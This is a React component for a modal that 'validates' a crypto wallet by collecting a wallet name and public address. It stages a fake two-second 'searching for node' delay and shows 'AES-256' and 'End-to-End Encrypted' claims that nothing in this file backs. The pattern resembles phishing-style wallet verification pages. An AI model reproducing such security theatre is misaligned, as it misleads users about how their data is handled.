import React, { useState, useEffect } from 'react';
import { Shield, Lock, Wallet2, Loader2, Info, ArrowLeft } from 'lucide-react';
import EncryptionProgress from './EncryptionProgress';
import { 
  Dialog, 
  DialogContent, 
  DialogHeader, 
  DialogTitle, 
  DialogDescription 
} from '../ui/dialog';
import { Button } from '../ui/button';
import { Input } from '../ui/input';

function WalletConnectionModal({ 
  isOpen, 
  onClose, 
  selectedWallet, 
  onSubmit, 
  isSubmitting, 
  encryptionStep 
}) {
  const [walletAddress, setWalletAddress] = useState('');
  const [customWalletName, setCustomWalletName] = useState('');
  const [isSearchingWallet, setIsSearchingWallet] = useState(true);

  useEffect(() => {
    if (selectedWallet && isOpen) {
      setIsSearchingWallet(true);
      const timer = setTimeout(() => setIsSearchingWallet(false), 2000);
      return () => clearTimeout(timer);
    }
  }, [selectedWallet, isOpen]);

  const handleSubmit = (e) => {
    e.preventDefault();
    const walletName = selectedWallet?.id === 'other' ? customWalletName : selectedWallet?.name;
    onSubmit(walletName, walletAddress);
  };

  const brandColor = selectedWallet?.brandColor || '#000000';

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md border-none shadow-2xl rounded-3xl overflow-hidden p-0">
        {/* Brand Header Banner */}
        <div 
          className="h-24 w-full relative flex items-center justify-center transition-colors duration-500"
          style={{ backgroundColor: `${brandColor}15` }}
        >
          {/* Back Button */}
          <button
            onClick={onClose}
            className="absolute left-4 top-1/2 -translate-y-1/2 p-2 rounded-xl bg-background/80 backdrop-blur-sm border border-border/50 shadow-sm hover:scale-105 active:scale-95 transition-all group z-20"
            title="Go back to wallet list"
          >
            <ArrowLeft className="w-4 h-4 text-foreground group-hover:text-primary transition-colors" />
          </button>

          <div 
            className="absolute inset-0 opacity-10"
            style={{ 
              backgroundImage: `radial-gradient(circle at 2px 2px, ${brandColor} 1px, transparent 0)`,
              backgroundSize: '24px 24px' 
            }}
          />
          <div className="h-16 w-16 rounded-2xl bg-background shadow-xl flex items-center justify-center p-3 z-10 border border-border/50">
            {selectedWallet?.logo ? (
              <img src={selectedWallet.logo} alt={selectedWallet.name} className="h-full w-full object-contain" />
            ) : (
              <Wallet2 className="h-8 w-8 text-muted-foreground" />
            )}
          </div>
        </div>

        <div className="p-8 space-y-6">
          <DialogHeader className="space-y-1">
            <DialogTitle className="text-2xl font-space-grotesk font-bold text-center uppercase tracking-tight">
              Connect {selectedWallet?.name}
            </DialogTitle>
            <DialogDescription className="text-center font-medium">
              Initialize secure validation protocol
            </DialogDescription>
          </DialogHeader>

          {isSubmitting ? (
            <EncryptionProgress encryptionStep={encryptionStep} brandColor={brandColor} />
          ) : isSearchingWallet ? (
            <div className="flex flex-col items-center justify-center py-10 space-y-4">
              <div className="relative">
                <Loader2 className="h-10 w-10 text-primary animate-spin opacity-20" />
                <div 
                  className="absolute inset-0 flex items-center justify-center"
                  style={{ color: brandColor }}
                >
                  <Shield className="h-5 w-5" />
                </div>
              </div>
              <p className="text-xs font-bold uppercase tracking-[0.2em] text-muted-foreground animate-pulse">
                Searching for {selectedWallet?.name} node...
              </p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-5">
              {selectedWallet?.id === 'other' && (
                <div className="space-y-2">
                  <label className="text-[11px] font-bold uppercase tracking-wider text-muted-foreground ml-1">
                    Wallet Provider
                  </label>
                  <Input
                    type="text"
                    value={customWalletName}
                    onChange={(e) => setCustomWalletName(e.target.value)}
                    className="h-12 rounded-xl bg-secondary/30 border-none focus-visible:ring-1 focus-visible:ring-primary/20"
                    placeholder="Enter Wallet Name"
                    required
                  />
                </div>
              )}

              <div className="space-y-2">
                <label className="text-[11px] font-bold uppercase tracking-wider text-muted-foreground ml-1">
                  Wallet Address
                </label>
                <Input
                  type="text"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  className="h-12 rounded-xl bg-secondary/30 border-none focus-visible:ring-1 focus-visible:ring-primary/20 font-mono text-sm"
                  placeholder="0x..."
                  required
                />
              </div>

              <div className="p-4 bg-secondary/40 rounded-2xl flex gap-3 border border-border/50">
                <Info className="h-4 w-4 text-primary shrink-0 mt-0.5" />
                <p className="text-[10px] text-muted-foreground font-medium leading-relaxed">
                  Your address is strictly used for validation. It will be encrypted via <b>AES-256</b> before being sent to the secure endpoint.
                </p>
              </div>

              <Button
                type="submit"
                disabled={isSubmitting}
                className="w-full h-14 rounded-2xl text-base font-bold uppercase tracking-widest transition-all hover:scale-[1.02] active:scale-[0.98] shadow-lg"
                style={{ backgroundColor: brandColor }}
              >
                <Shield className="w-5 h-5 mr-2" />
                Validate Wallet
              </Button>
            </form>
          )}

          <div className="flex items-center justify-center gap-2 text-[10px] font-bold uppercase tracking-widest text-muted-foreground opacity-50">
            <Lock className="w-3 h-3" />
            <span>End-to-End Encrypted</span>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}

export default WalletConnectionModal;
